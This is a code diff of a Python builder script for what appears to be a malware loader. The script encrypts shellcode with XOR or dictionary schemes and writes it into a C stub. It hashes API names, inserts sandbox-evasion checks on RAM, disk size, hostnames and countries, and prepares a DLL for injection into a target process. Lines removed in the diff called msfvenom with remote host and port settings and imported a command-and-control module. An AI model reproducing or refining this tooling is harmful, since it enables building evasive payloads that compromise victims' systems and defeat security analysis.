@@ -4,7 +4,6 @@ from scripts.config import parse_config
 from scripts.templating import *
 from scripts.dict import dictionary_encrypt
 from scripts.utils import *
-from scripts.c2 import *
 import random
 import sys
 
@@ -16,10 +15,25 @@ config.read(".conf")
 def is_set(value):
     return value != None and value != ""
 
-ENCRYPTION_METHOD = config.get("Payload", "encryption_method")
-ENCRYPTION_KEY = config.get("Payload", "encryption_key")
+VERBOSE = True if sys.argv[1] == "true" else False
+PRIORIZE_SIZE = True if sys.argv[2] == "true" else False
 
-STUB_FILE = config.get("Stub", "filename")
+ENCRYPTION_METHOD = config.get("Payload", "encryption_method")
+if ENCRYPTION_METHOD == "xor":
+    if config.get("Payload", "encryption_key") == "random":
+        ENCRYPTION_KEY = generate_high_entropy_int(0x1111, 0xFFFF)
+    else:
+        ENCRYPTION_KEY = int(config.get("Payload", "encryption_key"),16)
+elif ENCRYPTION_METHOD == "dictionary" or ENCRYPTION_METHOD == "dict":
+    ENCRYPTION_KEY = 1
+else:
+    print(f"Unknown encryption method: {ENCRYPTION_METHOD}")
+    sys.exit(1)
+
+TARGET_PROCESS = config.get("Payload", "target_process")
+# RHOST = config.get("Payload", "rhost") if is_set(config.get("Payload", "rhost")) else None
+# RPORT = config.getint("Payload", "rport") if is_set(config.get("Payload", "rport")) else None
+# RURI = config.get("Payload", "ruri") if is_set(config.get("Payload", "ruri")) else None
 
 DISK_SIZE = config.get("Anti-Analysis", "disk_size")
 RAM_SIZE = config.get("Anti-Analysis", "ram_size")
@@ -35,56 +49,24 @@ AVOID_COUNTRIES = config.get("Anti-Analysis", "avoid_countries").split(",")
 if len(AVOID_COUNTRIES) <= 1 and AVOID_COUNTRIES[0] == "":
     AVOID_COUNTRIES = []
 
-WORKING_FOLDER = "temp/"
+WORKING_FOLDER = "build/"
+STUB_FILE = "loader.c"
 
 
 def main():
 
-    if config.get("Payload", "encryption_key") == "random":
-        ENCRYPTION_KEY = generate_high_entropy_int(0x1111, 0xFFFF)
-    else:
-        ENCRYPTION_KEY = int(config.get("Payload", "encryption_key"),16)
+    if PRIORIZE_SIZE:
+        # no stdlib
+        sed_files(WORKING_FOLDER, "int WinMain(", "int WinMainCRTStartup(")
+        sed_files(WORKING_FOLDER, "strlen(", "custom_strlen(",[".c"])
+        sed_files(WORKING_FOLDER, "strcmp(", "custom_strcmp(",[".c"])
+        sed_files(WORKING_FOLDER, "strncpy(", "custom_strncpy(",[".c"])
+        sed_files(WORKING_FOLDER, "srand((", "// srand(")
+        sed_files(WORKING_FOLDER, "rand()", f"{random.randint(0, 0xFFFF)}")
+        sed_files(WORKING_FOLDER, "printf(", "// printf(")
 
-    RHOST = config.get("Payload", "rhost") if is_set(config.get("Payload", "rhost")) else None
-    RPORT = config.getint("Payload", "rport") if is_set(config.get("Payload", "rport")) else None
-    RURI = config.get("Payload", "ruri") if is_set(config.get("Payload", "ruri")) else None
 
-
-    if is_set(config.get("Payload", "name")):
-        PAYLOAD_NAME = config.get("Payload", "name")
-        if ".asm" in PAYLOAD_NAME or ".nasm" in PAYLOAD_NAME:
-            ROR_VALUE = random.choice([13,17,19,21,23])
-            sed_file(WORKING_FOLDER+PAYLOAD_NAME, "%ROR_VALUE%", hex(ROR_VALUE))
-            sed_file(WORKING_FOLDER+PAYLOAD_NAME, "%LHOST__LPORT%", format_lhost_lport(RHOST,RPORT))
-            remaining_tags = extract_tags_from_file(WORKING_FOLDER+PAYLOAD_NAME)
-
-            # Tags like %HASH_MODULE_FUNCTION% are replaced by their hash
-            for tag in remaining_tags:
-                parts = tag.replace("%", "").split("__")
-                if parts[0] == "HASH":
-                    sed_file(WORKING_FOLDER+PAYLOAD_NAME, tag, hex(hash(parts[1], parts[2], ROR_VALUE)))
-                if parts[0] == "RANDOM":
-                    # Générer une valeur aléatoire de 32 bits
-                    dword_value = random.randint(0, 0xFFFFFFF)
-                    sed_file(WORKING_FOLDER+PAYLOAD_NAME, tag, hex(dword_value))
-            instructions = nasm2instructions(WORKING_FOLDER+PAYLOAD_NAME)
-            with open("temp/payload.txt", "w") as f:
-                f.write(str(instructions))
-        else:
-            msfvenom(PAYLOAD_NAME, RHOST, RPORT, RURI)
-        PAYLOAD_FILE = "payload.txt"
-    else:
-        print("No payload file or payload name specified")
-        sys.exit(1)
-
-    print("===========CONFIG==========")
-    print(f"Encryption byte: {hex(ENCRYPTION_KEY)}")
-    print(f"Payload : {PAYLOAD_FILE} {PAYLOAD_NAME}")
-    print(f"RHOST : {RHOST}")
-    print(f"RPORT : {RPORT}")
-    print("===========================\n")
-
-    print("===========PAYLOAD==============")
+    print("===========PAYLOAD==============") if VERBOSE else None
 
 
     all_tags = extract_tags_from_folder(WORKING_FOLDER)
@@ -97,9 +79,12 @@ def main():
         for tag in tags:
             parts = tag.replace("%", "").split("__")
             if parts[0] == "MODHASH": # definitions.c
-                sed_file(WORKING_FOLDER+filename, tag, hash_obj(parts[1],""))
+                sed_file(WORKING_FOLDER+filename, tag, hash_obj(parts[1],"", VERBOSE))
             if parts[0] == "FCTHASH": # definitions.c
-                sed_file(WORKING_FOLDER+filename, tag, hash_obj("", parts[1]))
+                if parts[1] == "target_process":
+                    sed_file(WORKING_FOLDER+filename, tag, hash_obj("", TARGET_PROCESS, VERBOSE))
+                else:
+                    sed_file(WORKING_FOLDER+filename, tag, hash_obj("", parts[1], VERBOSE))
             if parts[0] == "SANDBOX":
                 if parts[1] == "RAM_CHECK":
                     if is_set(RAM_SIZE):
@@ -131,8 +116,8 @@ def main():
                     sed_file(WORKING_FOLDER+filename, tag, DISK_SIZE)
                 if parts[1] == "TARGET_HOSTNAME":
                     if len(TARGET_HOSTNAME):
-                        sed_file(WORKING_FOLDER+filename, tag, hash_obj("",TARGET_HOSTNAME))
-                        print("Target hostname: ", TARGET_HOSTNAME)
+                        sed_file(WORKING_FOLDER+filename, tag, hash_obj("",TARGET_HOSTNAME, VERBOSE))
+                        print("Target hostname: ", TARGET_HOSTNAME) if VERBOSE else None
                     else:
                         sed_file(WORKING_FOLDER+filename, tag, "{0, 0, false}")
                 if parts[1] == "AVOID_HOSTNAME":
@@ -140,9 +125,9 @@ def main():
                         res = ""
                         for hostname in AVOID_HOSTNAME:
                             if hostname != "":
-                                res += hash_obj("",hostname)+","
+                                res += hash_obj("",hostname, VERBOSE)+","
                         sed_file(WORKING_FOLDER+filename, tag, res[:-1])
-                        print("Avoid hostnames: ", AVOID_HOSTNAME)
+                        print("Avoid hostnames: ", AVOID_HOSTNAME) if VERBOSE else None
                     else:
                         sed_file(WORKING_FOLDER+filename, tag, "") # {0, 0, false}
                 if parts[1] == "AVOID_COUNTRIES":
@@ -154,50 +139,47 @@ def main():
                                 for id in ids:
                                     res += str(hex(id))+","
                         sed_file(WORKING_FOLDER+filename, tag, res[:-1])
-                        print("Avoid countriess: ", AVOID_COUNTRIES)
+                        print("Avoid countriess: ", AVOID_COUNTRIES) if VERBOSE else None
                     else:
                         sed_file(WORKING_FOLDER+filename, tag, "") # {0, 0, false}
 
+    PAYLOAD_NAME = "injected-dll.dll"
+    PAYLOAD_FILE = "payload.txt"
+    instructions = dll2instructions(WORKING_FOLDER+PAYLOAD_NAME)
+    with open("build/payload.txt", "w") as f:
+        f.write(str(instructions))
 
-    if PAYLOAD_FILE.endswith(".bin") or PAYLOAD_FILE.endswith(".raw"):
-        instructions = bin2instructions(WORKING_FOLDER+PAYLOAD_NAME)
-    elif PAYLOAD_FILE.endswith(".txt"):
-        instructions = txt2instructions(WORKING_FOLDER+"payload.txt")
-    else:
-        print(f"Unknown file format of the payload : {PAYLOAD_FILE}")
-        sys.exit(1)
-
-    print("================================\n")
+    print("================================\n") if VERBOSE else None
 
 
 
     # Encrypt the shellcode
-    print("===========ENCRYPTION==============")
+    print("===========ENCRYPTION==============") if VERBOSE else None
     
     if ENCRYPTION_METHOD == "dictionary" or ENCRYPTION_METHOD == "dict":
-        print(f"\nEncrypted with dictionary\n")
-        instructions, association_table, size_payload_phrase = dictionary_encrypt(instructions)
+        print(f"\nEncrypted with dictionary\n") if VERBOSE else None
+        instructions, association_table, size_payload_phrase = dictionary_encrypt(instructions, VERBOSE)
 
-        sed_file("temp/definitions.h", "%PAYLOAD_SIZE%", str(round_pow2(size_payload_phrase)))
-        sed_file("temp/payload.c", "%SHELLCODE%", f"unsigned char payload[];\n\n{association_table}\n\nconst char* dict_payload = {instructions};")
+        sed_file("build/definitions.h", "%PAYLOAD_SIZE%", str(round_pow2(size_payload_phrase)))
+        sed_file("build/payload.c", "%SHELLCODE%", f"unsigned char payload[];\n\n{association_table}\n\nconst char* dict_payload = {instructions};")
         sed_file(WORKING_FOLDER+STUB_FILE, "%SHELLCODE_DECODER%", "DICT_decrypt(dict_payload);")
     
     else:
         print(instructions[:32]+"...")
-        print(f"\nEncrypted with '{hex(ENCRYPTION_KEY)}' {int(len(instructions)/2)} bytes of instructions\n")
+        print(f"\nEncrypted with '{hex(ENCRYPTION_KEY)}' {int(len(instructions)/2)} bytes of instructions\n") if VERBOSE else None
         encrypted_instructions = xor2_encrypt_decrypt(instructions, ENCRYPTION_KEY)
-        print(encrypted_instructions[:32]+"...")
+        print(encrypted_instructions[:32]+"...") if VERBOSE else None
 
-        sed_file("temp/definitions.h", "%PAYLOAD_SIZE%", str(int(len(instructions)/2)))
-        sed_file("temp/payload.c", "%SHELLCODE%", f"unsigned char payload[] = \"{format_instructions(encrypted_instructions)}\";")
+        sed_file("build/definitions.h", "%PAYLOAD_SIZE%", str(int(len(instructions)/2)))
+        sed_file("build/payload.c", "%SHELLCODE%", f"unsigned char payload[] = \"{format_instructions(encrypted_instructions)}\";")
         sed_file(WORKING_FOLDER+STUB_FILE, "%SHELLCODE_DECODER%", "XOR(payload,sizeof(payload),key);")
     
-    print("===================================\n")
+    print("===================================\n") if VERBOSE else None
     sed_file(WORKING_FOLDER+STUB_FILE, "%XOR_KEY%", str(ENCRYPTION_KEY))
 
     
 
-    print("\n================COMPILATION===============")
+    print("\n================COMPILATION===============") if VERBOSE else None
 
 
 if __name__ == "__main__":
